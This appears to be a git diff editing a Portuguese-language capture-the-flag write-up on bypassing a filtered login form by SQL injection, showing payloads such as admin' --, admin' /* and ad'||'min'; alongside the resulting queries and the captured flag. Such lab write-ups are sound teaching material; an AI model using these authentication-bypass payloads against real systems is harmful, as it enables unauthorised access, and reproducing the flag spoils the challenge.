@@ -39,47 +39,27 @@ Senha: qualquercoisa
 SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'
 ```
 
-Neste caso, a parte da senha foi ignorada devido ao comentário, permitindo o login com o usuário "admin".
-
 ![image](https://github.com/user-attachments/assets/cfa0cf35-6072-4005-8687-220fffe93a8e)
+
+Neste caso, a parte da senha foi ignorada devido ao comentário, permitindo o login com o usuário "admin".
 
 Round 2:
 No segundo round, foi possível observar que mais palavras-chave estavam permitidas na consulta SQL, como /*, outro tipo de comentário. A ideia era testar se podíamos usar esses novos filtros para burlar a autenticação.
 
-round 2 -
-username:
-admin' /*          ( # e /* são outras formas de comentar)
-password:
-qualquercoisa
-
+Entrada:
+```
+Usuário: admin' /*
+Senha: qualquercoisa
+```
+```
 SELECT * FROM users WHERE username='admin' /*' AND password='1'
+```
+O filtro continuou permitindo que a parte da senha fosse ignorada e o login fosse feito com sucesso.
 
 
-round 3 -
-username:
-admin';              (o ; indica o final de uma execução e começo da outra)
-password:
-qualquercoisa
 
-SELECT * FROM users WHERE username='admin';' AND password='123'
 
-round 4 -
-username:
-ad'||'min';          ()
-password:
-qualquercoisa
 
-SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
-
-round 5 -
-username:
-ad'||'min';          ()
-password:
-qualquercoisa
-
-SELECT * FROM users WHERE username='ad'||'min';' AND password='123'
-
-filter.php
 
 icoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
 
